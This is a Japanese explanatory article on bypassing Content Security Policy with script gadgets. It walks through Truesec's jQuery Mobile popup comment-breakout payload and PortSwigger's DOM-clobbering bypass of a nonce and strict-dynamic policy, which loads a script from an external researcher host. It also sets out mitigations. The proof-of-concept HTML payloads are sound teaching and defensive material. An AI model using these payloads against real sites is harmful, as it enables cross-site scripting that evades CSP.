## CSPバイパス実例（Truesec / PortSwigger nonce）

CSP（Content Security Policy）は「どこから読み込まれたスクリプトなら実行してよいか」をブラウザに指示するHTTPレスポンスヘッダーです。厳格に設定すれば、攻撃者が`<script>`タグをHTMLインジェクションで注入しても、そのスクリプトのソース（`src`属性やインラインコード）がポリシーの許可リストに載っていない限りブラウザは実行を拒否します。

しかし「CSPが設定されている」ことと「XSSが起きない」ことはイコールではありません。CSPはあくまで**ブラウザが実行時に判定するホワイトリスト機構**であり、ポリシーが許可している既存の正規スクリプト（jQueryなどの一般的なライブラリ、あるいはサイト自身が読み込んでいるJavaScript）の**内部ロジックを乗っ取って攻撃者の狙い通りに動かす**ことができれば、CSP違反を一切起こさずに任意コード実行に到達できます。このテクニックは「スクリプトガジェット（Script Gadgets）」あるいは「コード再利用攻撃（Code-Reuse Attacks）」と呼ばれ、2017年にSebastian Lekies・Krzysztof Kotowicz・Eduardo Vela Nava らがACM CCSで発表した論文「Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets」で体系化されました。

本節では、この考え方を実例で示すTruesecのブログ記事と、実際にPortSwigger自身のサイトで見つかったnonceベースCSPのバイパス事例を通して、「CSPがあっても壊れる仕組み」を掘り下げます。

### スクリプトガジェットの基本発想

スクリプトガジェットとは、「攻撃者が直接JavaScriptを注入しなくても、既存の正規コードに特定のDOM状態（要素・属性・テキスト）を与えるだけで、そのコードが代わりにJavaScriptを実行してくれる」ような処理のことです。バイナリ解析の世界でいう「ROP（Return-Oriented Programming）ガジェット」のWeb版だと考えると理解しやすいでしょう。攻撃者は新しい命令（コード）を注入するのではなく、既にメモリ（この場合はページ内の正規スクリプト）に存在する命令列を、入力データで無理やり組み合わせて悪用します。

ガジェットは大まかに次のように分類されます。

- **文字列操作ガジェット**: 属性値やテキストをそのままevalやinnerHTMLに渡してしまう処理
- **要素構築ガジェット**: ユーザー入力を元にDOM要素を組み立てる際、エスケープが不十分な処理
- **関数生成ガジェット**: `new Function()`やテンプレートエンジンの式評価器
- **実行シンク**: 最終的に`eval`・`setTimeout(string)`・`Function`コンストラクタなどJavaScriptとして解釈させる箇所

CSPがブロックするのは「攻撃者が新しく持ち込んだスクリプト」であって、「サイトにもとから存在し許可された正規スクリプトが、汚染されたデータをもとに実行する処理」ではありません。ここに抜け道が生まれます。

### Truesecの実例：jQuery Mobile Popup Widgetを使ったコード再利用攻撃

Truesecのブログ記事は、この「ガジェット」の考え方を具体的なjQuery Mobileの脆弱な処理を使って再現したものです。

> 出典: Bypassing modern XSS mitigations with code-reuse attacks — https://www.truesec.com/hub/blog/bypassing-modern-xss-mitigations-with-code-reuse-attacks

#### 前提となるCSP設定

記事で例示されているCSPは次のようなものです。

```
Content-Security-Policy: script-src 'self' https://code.jquery.com:443 'unsafe-eval'; object-src 'none';
```

これは一見厳しく見えます。攻撃者が任意のドメインからスクリプトを読み込むこと（外部の`evil.com/x.js`のようなURL）はブロックされますし、`object-src 'none'`によってFlash等を使ったプラグイン系のバイパスも塞がれています。しかし`https://code.jquery.com`という**CDN経由の正規ライブラリ**が許可リストに載っている点がポイントです。攻撃者はこのjQuery自身（あるいはjQuery Mobile）のコードを「踏み台」として使います。

#### 脆弱な処理：Popup Widgetのid出力

jQuery Mobileには`data-role="popup"`でポップアップUIを生成するウィジェットがあります。このウィジェットは、指定された`id`属性の値を、内部的にHTMLコメントとして書き出す処理を持っていました（ポップアップの一意な識別・後方互換のためのマークアップ生成ロジックの一部です）。ここでの核心的な問題は、`id`属性の値が**エスケープされずにHTMLコメントの内側にそのまま書き込まれる**ことです。

HTMLコメントは`<!--`で始まり`-->`で終わります。攻撃者が`id`属性の値の中に`-->`という文字列を仕込めば、生成されたHTMLの中でコメントがそこで**強制終了**し、それ以降に続けて書いた文字列は通常のHTMLとしてパーサに解釈されます。これは「パーサの再解釈（コンテキストブレイクアウト）」の典型例です。ペイロードは次のようになります。

```html
<div data-role="popup" id="--!><script>alert(1)</script>"></div>
```

これをHTMLインジェクション（たとえば反射型XSSの脆弱なパラメータや、掲示板のような場所へのマークアップ注入）で流し込むと、jQuery Mobileのポップアップ初期化コードが`id`属性値をそのままコメント文字列に埋め込みます。結果として生成されるHTML断片は概ね次のような形になります。

```html
<!-- id: --!><script>alert(1)</script> -->
```

`-->`の直前に`--`が既にあるため、パーサ的には`id: --` + `!>` の時点でコメントが終了し、続く`<script>alert(1)</script>`が独立したscript要素としてDOMに現れます。ここで挿入されるのはインラインの`<script>`タグですが、これは**攻撃者が最初から用意していたペイロード文字列がjQuery Mobileの正規コードによってDOMに書き込まれた結果**であり、jQuery自体（`code.jquery.com`）はCSPで許可済みのソースとして実行されます。つまりCSPの`script-src`ディレクティブに違反する新規外部スクリプトの読み込みは一切発生せず、既存の許可されたスクリプト（jQuery Mobile本体）が、汚染された`id`値というデータを経由して攻撃者の望むDOM操作（scriptタグの挿入）を代行してくれるわけです。

記事ではさらに前段として、シンプルな`img`要素のonerrorガジェットも紹介されています。

```html
<img src="n/a" onerror="alert('XSS')"/>
```

これ自体はCSPが`script-src`でインラインイベントハンドラをブロックしていれば通常は動きません（`unsafe-inline`が無い限りイベントハンドラ属性はCSP違反になります）。Truesecの主張は、こうした素朴なペイロードが弾かれる状況でも、ライブラリの内部ロジックというもう一段深い「実行経路」を使えば、CSPが想定していない形でコードが実行されるということです。

#### 影響を受けたバージョンと位置づけ

記事および関連する2017年のLekiesらの原論文では、検証対象として**jQuery 1.8.3およびjQuery Mobile 1.2.1**が例示されています。より重要なのは個別のバージョンそのものよりも、この研究が調査対象とした**16の広く使われているJavaScriptライブラリのほぼすべてに、複数のスクリプトガジェットが存在した**という事実です。つまり「今使っているライブラリのこのバージョンさえ避ければ安全」という単純な話ではなく、複雑なDOM操作ロジックを持つライブラリ全般に共通するリスクだと理解する必要があります。この種の問題は個別のCVE番号で管理されるというより、「XSSフィルタ／CSP／サニタイザのバイパス手法そのもの」として研究コミュニティに認識されています。

#### 防御策

Truesecが強調する対策は次の3点に集約されます。

1. **根本原因の修正を優先する**: CSPはあくまで多層防御の一枚であり、根本的にはユーザー制御下のデータを挿入先のコンテキスト（HTML本文・属性値・URL・JavaScript文字列など）に応じて正しくエンコード／エスケープすることが必須です。
2. **secure-by-defaultなフレームワークを使う**: Angularの`trustAsHtml`やReactの`dangerouslySetInnerHTML`のような「危険であることが名前からも分かる」APIを避け、フレームワークが標準で提供する自動エスケープ機構に乗ること。
3. **CSPを唯一の防御層にしない**: 「CSPはバイパスされうる」という前提に立ち、脆弱性そのものの修正、入力サニタイズ、出力エンコーディングと組み合わせた多層防御を行うこと。

### PortSwiggerの実例：動的解析でnonceベースCSPを崩す

もう一つの実例は、PortSwigger Researchが自社サイト（portswigger.net）で実際に発見した、nonceベースCSPのバイパスです。これは「Burp Scannerの動的解析（Dynamic Analysis）」がどのように実際のCSPバイパスを自動検出したかというケーススタディでもあります。

> 出典: Hunting nonce-based CSP bypasses with dynamic analysis — https://portswigger.net/research/hunting-nonce-based-csp-bypasses-with-dynamic-analysis （公開日: 2021年9月17日）

#### nonceベースCSPが想定している保護

nonceベースCSPとは、ページを描画するたびにサーバー側でランダムな一回限りのトークン（nonce）を生成し、レスポンスヘッダーとHTML中の`<script>`タグの両方に埋め込む方式です。

```
Content-Security-Policy: script-src 'nonce-r4nd0m123' 'strict-dynamic';
```

```html
<script nonce="r4nd0m123">/* 正規スクリプト */</script>
```

ブラウザは、実行しようとしているスクリプト要素の`nonce`属性値がCSPヘッダーで宣言された値と一致する場合のみ実行を許可します。攻撃者はレスポンスのたびに変わるこのトークンの値を事前に知ることができないため、HTMLインジェクションで`<script>`タグを注入しても、正しい`nonce`値を付与できず実行がブロックされる——というのが設計上の想定です。

さらに`'strict-dynamic'`というキーワードが付与されている場合、挙動が一段複雑になります。これは「nonceで信任されたスクリプトが、実行中に動的に生成・挿入した新しいスクリプト」については、その新しいスクリプト自身にnonceが付いていなくても信頼を引き継いで実行してよい、というルールです。これは正規のSPAフレームワークなどが実行時に`document.createElement('script')`で追加のコードを読み込む挙動を壊さないための救済措置ですが、裏を返せば「**nonceで信任された既存スクリプトの内部ロジックさえ乗っ取れれば、そこから生成される新しいスクリプトはnonceなしで実行できてしまう**」という、CSPにおける典型的なスクリプトガジェットの温床になります。

#### 発見された脆弱なコード

PortSwiggerの記事によれば、Burp Scannerの動的解析エンジンが、あるページ上のJavaScriptで「input要素の値がscriptタグのURLをコントロールしている」パターンを自動的に検出しました。該当する（サイト自身が読み込んでいた）正規のJavaScriptはおおむね次のような処理でした。

```javascript
var t = document.querySelector("[id^='RecaptchaClientUrl-']").value,
    i = document.querySelector("[id^='RecaptchaClientSecret-']").value,
    n = document.createElement("script");
n.id = "RecaptchaScript";
n.src = t + i;
```

これはGoogle reCAPTCHA連携用のスクリプトを動的に読み込むための、ごく普通に見えるコードです。`id`が`RecaptchaClientUrl-`から始まる要素の`value`を読み取り、それを新しく作った`<script>`要素の`src`に組み立てて挿入しています。ここでの`querySelector`は、**CSSセレクタにマッチする最初の1要素だけ**を返す仕様であることが決定的な弱点になります。

#### 攻撃：DOM Clobberingでガジェットの入力を乗っ取る

もしページ上のどこかに攻撃者がHTMLを注入できる場所（たとえ小さなHTMLインジェクションであっても）があれば、次のような要素を、正規の`RecaptchaClientUrl-...`という`id`を持つ本物の要素より**DOM上で先に**出現するように注入します。

```html
<input id="RecaptchaClientUrl-" value="//portswigger-labs.net/xss/xss.js">
```

先に説明した正規コードが実行されるとき、`document.querySelector("[id^='RecaptchaClientUrl-']")`はDOM順で最初にマッチした要素、つまり攻撃者が注入したこの`<input>`を返します。結果として`n.src`には攻撃者が完全に制御する外部URL（`//portswigger-labs.net/xss/xss.js`）が代入され、`document.head`などに追加された時点でそのスクリプトが読み込まれ、実行されます。

ここで見落としてはならないのは、**この`<script>`要素には`nonce`属性が一切付与されていない**という点です。それでもブロックされずに実行されたのは、この`<script>`要素自体が「nonceで信任済みの正規スクリプト（reCAPTCHA連携コード）」によって動的に生成・挿入されたものであり、CSPポリシーに`'strict-dynamic'`が含まれていたためです。`'strict-dynamic'`のルールにより、信任されたスクリプトが生成した子スクリプトは、URLのホワイトリストチェックもnonceチェックも受けずに実行を許可されます。つまりこの攻撃は、

1. HTMLインジェクションで属性を上書きする**DOM Clobbering**（正規コードが参照するはずの要素を、攻撃者が用意した別の要素で「かぶせて」乗っ取るテクニック）と、
2. `querySelector`が「最初の一致」しか見ないという仕様、
3. `'strict-dynamic'`が動的生成スクリプトへの信頼を継承する仕様

という3つの要素が組み合わさって成立する、教科書的なスクリプトガジェット攻撃です。攻撃者は一切新しいJavaScriptコードそのものを注入していません。注入したのは単なる`<input>`要素であり、実際に悪意あるスクリプトを`document.head`に挿入して実行したのは、サイト自身が書いた正規のreCAPTCHA連携コードです。

#### 発見手法：Burp Scannerの動的解析

この脆弱性は人間の目視によるコードレビューではなく、**Burp Scannerの動的解析（Dynamic Analysis）**によって自動的にフラグが立てられました。記事の言葉を借りれば「Burp scanner had spotted that the value of an input element was being used to control a script URL」——つまりスキャナーは、ページの実行をブラウザエンジン上で追跡し、「input要素の値がスクリプトのURL生成に流れ込んでいる」というデータフローそのものを検出したということです。これは静的なパターンマッチ（正規表現でペイロード文字列を探す）ではなく、実際にDOM操作の結果を動的に観測して「攻撃者が制御可能な値が、危険なシンク（この場合はscriptのsrc生成）に到達するか」を追跡する手法であり、スクリプトガジェットのようにペイロード自体が単純な入力データにしか見えないケースの発見に強みを持ちます。

#### 修正・教訓

記事が示す推奨修正は非常にシンプルです。

> "The best fix for this issue is to avoid giving an attacker control over the URL, so specifying a static string to the script's location would prevent this issue."（この問題への最良の修正は、攻撃者にURLの制御権を与えないことである。スクリプトの読み込み先を静的な文字列として直接指定すれば、この問題は防止できる。）

つまり、そもそも「DOMから動的に値を読み取ってスクリプトのURLを組み立てる」という設計自体をやめ、スクリプトのURLをコード内にハードコードすべきだった、ということです。PortSwiggerはこの報告を受けてCSP設定・該当コードを修正しました。

この事例が示す教訓は明確です。

- **nonceや`'strict-dynamic'`があっても、正規スクリプトの内部ロジックが「攻撃者が影響できるDOM値」から実行対象を決定していれば、そこがガジェットになる**。
- **DOM Clobbering（同じidを持つ要素をすり替える、あるいは先に出現させる）は、`querySelector`・`getElementById`のように「最初の一致」を返すAPIと組み合わさると特に危険**。CSPそのものをすり抜けるだけでなく、DOM上の変数参照を書き換えてロジック全体を乗っ取る手段として広く応用が利く。
- **重要な脆弱性は自動化されたツール（動的解析）によっても発見できる**。ペイロードの見た目が「ただのHTMLインジェクション」であっても、その先に危険なシンクへ到達するデータフローがあるかどうかを実行時に追跡することが有効。

### まとめ：CSPは万能ではない

TruesecとPortSwiggerの2つの実例は、まったく異なるメカニズム（HTMLコメントの脱出 vs DOM Clobbering + strict-dynamic）を使っていますが、共通する本質は同じです。**CSPは「新しく持ち込まれた不正なスクリプト」を防ぐことには強い一方、「もとから許可されている正規スクリプトが、汚染されたデータをもとに危険な処理を代行してしまう」ケースには無力**だということです。これは`unsafe-eval`やインラインスクリプトを禁止するような厳格な設定であっても変わりません。

実務上の教訓として、CSPを導入する際は次の点を意識すべきです。

- ホワイトリストに載せるライブラリやCDNは、それ自体がガジェット（DOM操作を汚染データから行う処理）を持たないか検討する。特にjQuery系・テンプレートエンジン系・古いUIウィジェットライブラリは要注意。
- `'strict-dynamic'`を使う場合、動的に生成されるスクリプトの`src`やコンテンツが、いかなる経路であってもユーザー制御下のDOM値から組み立てられていないかを確認する。
- `querySelector`・`getElementById`・`window`のグローバル変数参照など、「複数の要素が同じ名前・IDを持ちうる」箇所は、DOM Clobberingの被害を受けやすい設計になっていないか点検する。
- CSPはあくまで多層防御の一部と位置づけ、根本的な出力エンコーディングや入力バリデーションを省略しない。

CSPバイパスの発見は年々、こうした「地味なガジェット探し」にシフトしています。ペイロードそのものより、「このサイトにはどんな正規スクリプトが動いていて、それはどんなDOM値を信用しているか」を読み解く力が、CSP環境下でのXSS発見において最も重要なスキルになります。
